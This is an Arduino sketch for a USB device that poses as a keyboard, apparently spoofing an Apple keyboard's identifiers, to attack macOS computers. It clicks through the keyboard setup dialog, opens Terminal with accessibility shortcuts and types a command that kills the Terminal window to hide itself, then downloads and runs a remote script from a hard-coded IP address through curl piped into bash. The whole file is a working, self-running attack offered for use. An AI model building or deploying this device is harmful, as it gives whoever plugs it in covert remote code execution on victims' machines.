#include "HID-Project.h"
#include "Usb.h"

void wait(unsigned long dwMs) {
  unsigned long startWaitTime = millis();
  unsigned long waitTimeRemain = (startWaitTime+dwMs-millis());
  if (dwMs != 0) {
    while (waitTimeRemain > 15) {
      waitTimeRemain = startWaitTime+dwMs-millis();
      
      if (waitTimeRemain>500) {
        millis();
      } else if (waitTimeRemain > 125) {
        delay(110);
      } else {
        delay(waitTimeRemain-14);
      }
      setLight();
    }
    delay(startWaitTime+dwMs-millis());
  }
}
bool light = false;
int lightPin = 7;
void setLight() {
  pinMode(lightPin, OUTPUT);
  if (((millis() % 2000) < 1000) && (light == false)) {
    digitalWrite(lightPin, HIGH);
    light = true;
  } else if (((millis() % 2000) >= 1000) && (light == true)) {
    digitalWrite(lightPin, LOW);
    light = false;
  }
}
void setLight(bool state) {
  pinMode(lightPin, OUTPUT);
  if (state) {
    digitalWrite(lightPin, HIGH);
    light = true;
  } else if (!state) {
    digitalWrite(lightPin, LOW);
    light = false;
  }
}

void shortcut(KeyboardKeycode first, KeyboardKeycode second, unsigned long timeMultiplier = 1) {
  
  Keyboard.press(first);
  wait(100 * timeMultiplier);
  Keyboard.flush();
  
  Keyboard.press(second);
  wait(50 * timeMultiplier);
  Keyboard.flush();

  Keyboard.release(second);
  wait(50 * timeMultiplier);
  Keyboard.flush();
  
  Keyboard.release(first);
  wait(10 * timeMultiplier);
  Keyboard.flush();
}
void shortcut(KeyboardKeycode first, KeyboardKeycode second, KeyboardKeycode third, unsigned long timeMultiplier = 1) {
  Keyboard.press(first);
  wait(80 * timeMultiplier);
  Keyboard.flush();

  Keyboard.press(second);
  wait(50 * timeMultiplier);
  Keyboard.flush();

  Keyboard.press(third);
  wait(50 * timeMultiplier);
  Keyboard.flush();

  Keyboard.release(third);
  wait(80 * timeMultiplier);
  Keyboard.flush();
  
  Keyboard.release(second);
  Keyboard.release(first);
  Keyboard.flush();
}

void command(KeyboardKeycode k) {
  shortcut(KEY_LEFT_GUI, k);
}

void openSpotlight() {
  command(KEY_SPACE);
  wait(100);
}
void openTerminal() {
  // openSpotlight();
  Keyboard.print("terminal");
  Keyboard.flush();
  wait(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.flush();
  wait(50);
  Keyboard.release(KEY_RETURN);
  Keyboard.flush();
}
bool keyboardAccessStatus = false;
int keyboardAccessUses = 0;
void toggleKeyboardAccess(bool endWait = true, unsigned long timeMultiplier = 1) {  
  if (keyboardAccessUses == 0) {
    wait(900);
  }
  wait(10 * timeMultiplier);
  shortcut(KEY_LEFT_CTRL, KEY_F1, timeMultiplier);
  if (endWait) {
    wait(30 * timeMultiplier);
  }
  keyboardAccessStatus = !keyboardAccessStatus;
  keyboardAccessUses++;
}
void quickOpenTerminal() {
  toggleKeyboardAccess(true, 4); //7 if fail
  shortcut(KEY_LEFT_CTRL, KEY_F3, 1);
  wait(30);

  Keyboard.write(KEY_RETURN);
  Keyboard.flush();
  wait(50);

  shortcut(KEY_LEFT_SHIFT, KEY_LEFT_GUI, KEY_U, 0);
  wait(780); // if charger then do 600 or more, if not charger then assume computer is more charged and say 300

  Keyboard.print("Terminal");
  wait(0);
  shortcut(KEY_LEFT_GUI, KEY_O,0);
  Keyboard.releaseAll();
  toggleKeyboardAccess(false,0);
}
void hide() {
  command(KEY_H);
}
void quit() {
  command(KEY_Q);
}

long start = 0;
long startVisable = 0;
long startTerminal = 0;
long startOpenTerminal = 0;
long endOpenTerminal = 0;
long startPayload = 0;
long endPayload = 0;
long end = 0;

bool found = false;
bool SpoofingAppleKeyboard = false;
void setup() {

  pinMode(lightPin, OUTPUT);

  // USB_VID = 0x05ac
  // USB_PID = 0x0267
  
  // open the serial port:
  Serial.begin(9600);
  // initialize control over the keyboard:
  Keyboard.begin();
  AbsoluteMouse.begin();

  if (USB_VID == 0x05ac && USB_PID == 0x0267) { // check if USB VID and PID are set to the VID and PID of an apple keyboard
    SpoofingAppleKeyboard = true;
  } else {
    SpoofingAppleKeyboard = false;
  }
  start = millis();
}



bool waiting = true;
int loops = 0;
int size = 32000; // the size of the screen (of most recent MacBook Air laptops) should only be used if USB VID doesnt match an apple keyboard
void loop() {
  loops++;
  setLight();
  if (SpoofingAppleKeyboard && (loops < 140)) {
    loops = 140;
  }
  if (loops <= 100) {
    AbsoluteMouse.moveTo(0.5 * size, 0.65 * size);  // (720, 450)
    //   AbsoluteMouse.moveTo(10 * (1050 - 720), 10 * (740 - 450));  // needto go to 1050, 740
  }
  if (loops == 100) {
    startVisable = millis();
    AbsoluteMouse.click();  // (720, 450)
    //   AbsoluteMouse.moveTo(10 * (1050 - 720), 10 * (740 - 450));  // needto go to 1050, 740
  }
  if (loops == 110) {
    Keyboard.write('z');
  }
  if (loops == 120) {
    Keyboard.write('/');
  }
  if (loops == 125) {
    AbsoluteMouse.moveTo(0.5 * size, 0.65 * size);
  }
  if (loops == 137) {
    AbsoluteMouse.click();
  }
  if (loops == 138) {
    AbsoluteMouse.click();
  }
  if (loops == 139) {
    AbsoluteMouse.moveTo(size, size);
  }
  wait(3);

  if (loops == 140) {
    // openSpotlight();
    startTerminal = millis();
    startOpenTerminal = millis();
    quickOpenTerminal();
    endOpenTerminal = millis();
    
    wait(775);
    startPayload = millis();
    for (int i = 0; i<2; i++) {
      Keyboard.print("nohup bash -c \"kill -s kill \\\"\\$(ps -e |grep Termina |grep -v gr |xargs |cut -d \' \' -f1)\\\";bash <(curl --retry 999 --retry-all-errors -s http://54.227.43.238/b)\" &");
      Keyboard.press(KEY_RETURN);
      Keyboard.release(KEY_RETURN);
    }
    endPayload = millis();
  }
  if ((loops > 140)&&(loops<300)) {
    AbsoluteMouse.moveTo(size, size);
  }
  if (loops == 300) {
    AbsoluteMouse.moveTo(size * 0.09, -size * 0.29);
    wait(20);
    AbsoluteMouse.click();
    wait(5);
    AbsoluteMouse.releaseAll();
    end = millis();
    Keyboard.releaseAll();
  }
  if (loops == 400) {
    command(KEY_W);    
  }
  // Done
}